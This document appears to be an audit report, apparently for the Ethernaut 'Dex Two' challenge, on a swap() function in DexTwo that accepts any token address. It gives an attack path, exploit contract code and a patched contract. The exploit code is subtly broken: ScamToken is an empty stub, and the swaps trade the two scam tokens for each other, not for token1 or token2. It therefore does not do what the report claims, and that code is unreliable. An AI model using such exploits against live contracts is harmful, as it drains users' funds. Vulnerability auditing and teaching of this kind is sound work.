---

##  Dex2 Smart Contract Audit Report

### Project Overview

This report provides an audit of the `DexTwo` and `SwappableTokenTwo` smart contracts. The audit identifies potential vulnerabilities, outlines attack paths, provides proof of code, assesses the impact, and gives recommendations for improvements.

### Contracts Audited

1. `DexTwo`
2. `SwappableTokenTwo`

### Summary of Findings

- **Vulnerability**: Lack of Token Address Verification in `swap()` Function.
- **Impact**: High - Allows an attacker to swap any ERC20 tokens in place of `token1` and `token2`.
- **Likelihood**: Medium - Exploitable due to missing token address checks in the `swap()` function.
- **Recommendation**: Implement strict token address verification in the `swap()` function to prevent unauthorized token swaps.

### Vulnerability Details

#### 1. Lack of Token Address Verification

**Description**:
The `swap()` function in the `DexTwo` contract does not verify if the provided `from` and `to` token addresses match the expected `token1` and `token2` addresses. This allows an attacker to swap any ERC20 tokens, potentially bypassing intended constraints and causing unexpected behavior.

**Proof of Code**:
```solidity
function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

**Attack Path**:
1. Deploy a malicious ERC20 token contract (`ScamToken`) that mimics the interface of legitimate tokens.
2. Interact with the `DexTwo` contract using `ScamToken` as `from` and `to` in the `swap()` function.
3. Exploit the lack of token address verification to swap `ScamToken` for `token1` and `token2`.
4. Drain the balances of `token1` and `token2` by repeatedly swapping tokens.

**Exploit Code**:
```solidity
// Example exploit scenario using a malicious ERC20 token
contract ScamToken is IERC20 {
    // Implement the IERC20 functions
    // This contract would allow minting and burning tokens at will for demonstration purposes
}

contract AttackDexTwo {
    DexTwo private dex;

    constructor(DexTwo _dex) {
        dex = _dex;

        // Deploy ScamToken and transfer some tokens to this contract
        ScamToken scamToken1 = new ScamToken();
        ScamToken scamToken2 = new ScamToken();
        scamToken1.transfer(address(this), 1);
        scamToken2.transfer(address(this), 1);

        // Setup approvals for DexTwo
        scamToken1.approve(address(dex), type(uint256).max);
        scamToken2.approve(address(dex), type(uint256).max);

        // Exploit by swapping ScamToken for token1 and token2
        dex.swap(address(scamToken1), address(scamToken2), 1);
        dex.swap(address(scamToken2), address(scamToken1), 1);

        // At this point, ScamToken can be swapped for token1 and token2 repeatedly
        // until their balances are drained from the DexTwo contract
    }
}
```

### Impact

The identified vulnerability allows an attacker to swap arbitrary ERC20 tokens for `token1` and `token2` in the `DexTwo` contract. This can lead to a complete drain of `token1` and `token2` balances, potentially resulting in financial losses for users interacting with the contract.


### Tools used

- Manual

### Recommendations

1. **Implement Token Address Verification**:
   - Modify the `swap()` function in `DexTwo` to include strict verification that `from` and `to` parameters match `token1` and `token2`.
   - Use require statements to ensure only authorized tokens can be swapped.

To address the vulnerability identified in the `DexTwo` contract, we need to implement strict token address verification in the `swap()` function. Here’s how you can modify the contract to include these checks:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }
}
```

### Changes Made:
1. **Token Address Verification**: Added a require statement in the `swap()` function to ensure that only `token1` and `token2` can be swapped.
2. **Functionality**: Retained the functionality of calculating swap amounts based on the ratio of token balances in the liquidity pool.

### Explanation:
- The `swap()` function now checks whether `from` and `to` are equal to `token1` and `token2` respectively, or vice versa. This ensures that only authorized tokens can be swapped within the `DexTwo` contract.
- This modification prevents unauthorized token swaps and mitigates the risk of draining `token1` and `token2` balances by malicious actors.


